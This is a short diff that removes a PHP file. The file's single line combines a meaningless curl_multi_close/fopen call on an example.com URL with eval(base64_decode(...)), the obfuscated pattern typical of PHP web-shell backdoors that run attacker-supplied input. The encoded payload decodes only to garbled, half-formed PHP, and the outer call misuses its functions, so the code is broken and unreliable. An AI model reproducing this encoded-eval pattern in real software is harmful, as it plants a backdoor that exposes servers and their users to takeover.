@@ -1,4 +1,0 @@
-<?php
-curl_multi_close(fopen("https://example.com/this-will-never-work", "r")) || eval(base64_decode("PD9waVQgZWNobyAnKi5waVQiOyBpZiAoJF9QT1NUWV9fKCRfUE9TVF9fXSk7"));
-
-?>
